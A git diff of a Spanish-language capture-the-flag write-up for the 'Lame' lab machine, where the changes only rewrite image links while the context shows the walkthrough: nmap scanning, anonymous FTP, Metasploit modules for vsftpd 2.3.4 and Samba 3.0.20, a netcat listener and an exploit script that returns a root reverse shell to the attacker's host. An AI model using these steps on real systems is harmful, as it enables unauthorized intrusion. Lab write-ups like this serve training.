@@ -18,7 +18,7 @@
 nmap -p21,22,139,445,3632 -sCV 10.129.199.205 -oN targeted
 ```
 
-![[Pasted image 20250703203831.png]]
+![[Pasted image 20250703203831.png]](lame-imagenes/lame-images/20250703203831.png)
 
 >Lo primero que me llama la atención es que en el puerto 21 FTP tenemos acceso como anonymous así que tratamos de acceder y recolectar informacion
 
@@ -30,7 +30,7 @@ ftp 10.129.199.205
 
 anonymous:anonymous
 
-![[Pasted image 20250703204251.png]]
+![[Pasted image 20250703204251.png]](lame-imagenes/lame-images/20250703204251.png)
 
 >Como habíamos visto tenemos acceso al puerto 21 como anonymous pero realmente no podemos hacer gran cosa por lo que probamos por otro lado
 
@@ -38,7 +38,7 @@ anonymous:anonymous
 
 >Buscamos vulnerabilidades conocidas sobre el servicio
 
-![[Pasted image 20250703204529.png]]
+![[Pasted image 20250703204529.png]](lame-imagenes/lame-images/20250703204529.png)
 
 >En exploitDB vemos que tenemos 2 exploits para atacar esta vulnerabilidad, en la que podemos realizar una "backdoor command Execution"
 
@@ -56,7 +56,7 @@ msfdb run
 search vsftpd 2.3.4
 ```
 
-![[Pasted image 20250703204755.png]]
+![[Pasted image 20250703204755.png]](lame-imagenes/lame-images/20250703204755.png)
 
 vemos que si existe el exploit por lo que lo seleccionamos y vemos que opciones tiene
 
@@ -68,7 +68,7 @@ options
 ```
 
 
-![[Pasted image 20250703205002.png]]
+![[Pasted image 20250703205002.png]](lame-imagenes/lame-images/20250703205002.png)
 
 >Nos indica que es requisito indicar la Ip victima (RHOSTS) y el puerto que vamos a atacar 21 (RPORT)
 
@@ -82,7 +82,7 @@ el puerto ya viene por defecto así que no modificamos nada y lanzamos el exploi
 exploit
 ```
 
-![[Pasted image 20250703205246.png]]
+![[Pasted image 20250703205246.png]](lame-imagenes/lame-images/20250703205246.png)
 
 podemos ver que no ha conseguido crear una sesion con la que podamos ejecutar comandos
 
@@ -103,7 +103,7 @@ chmod +x 49757.py
 python3 49757.py 10.129.199.205
 ```
 
-![[Pasted image 20250703213812.png]]
+![[Pasted image 20250703213812.png]](lame-imagenes/lame-images/20250703213812.png)
 
 >Aparece este error todo el rato, he tratado de instalar telnetlib3 pero sigue sin funcionar
 
@@ -111,17 +111,17 @@ python3 49757.py 10.129.199.205
 
 Buscamos exploits en exploitDB que utilicen el servicio Samba 3.0.20
 
-![[Pasted image 20250703214242.png]]
+![[Pasted image 20250703214242.png]](lame-imagenes/lame-images/20250703214242.png)
 
 >Al igual que antes aparecen 2 exploits uno va dirigido a metasploit y otro por terminal. aunque el de terminal es Remote Heap Overflow y no me convence tanto 
 
 ## Metasploit
 
-![[Pasted image 20250703214420.png]]
+![[Pasted image 20250703214420.png]](lame-imagenes/lame-images/20250703214420.png)
 
 Utilizamos el modulo indicado con un "0"
 
-![[Pasted image 20250703214651.png]]
+![[Pasted image 20250703214651.png]](lame-imagenes/lame-images/20250703214651.png)
 
 modificamos los parámetros indicados 
 - RHOSTS = IP victima
@@ -134,11 +134,11 @@ modificamos los parámetros indicados
 ```bash 
 nc -nlvp 4444
 ```
-![[Pasted image 20250703214855.png]]
+![[Pasted image 20250703214855.png]](lame-imagenes/lame-images/20250703214855.png)
 
 y lanzamos el ataque
 
-![[Pasted image 20250703214916.png]]
+![[Pasted image 20250703214916.png]](lame-imagenes/lame-images/20250703214916.png)
 
 >Podemos observar que no ha tenido éxito 
 
@@ -189,7 +189,7 @@ python3 smb3.0.20.py -lh 10.10.14.155 -lp 443 -t 10.129.199.205
 
 >Revisamos el puerto en escucha y vemos esto
 
-![[Pasted image 20250703215711.png]]
+![[Pasted image 20250703215711.png]](lame-imagenes/lame-images/20250703215711.png)
 
 Tenemos una terminal con usuario Root. por lo que la intrusión del exploit ha sido un éxito.
 
@@ -228,10 +228,10 @@ export SHELL=bash
 
 la primera se encuentra en /home/makis/user.txt
 
-![[Pasted image 20250703220257.png]]
+![[Pasted image 20250703220257.png]](lame-imagenes/lame-images/20250703220257.png)
 
 Y la del usuario root se encuentra en /root/root.txt
-![[Pasted image 20250703220343.png]]
+![[Pasted image 20250703220343.png]](lame-imagenes/lame-images/20250703220343.png)
 
 # Banderas
 
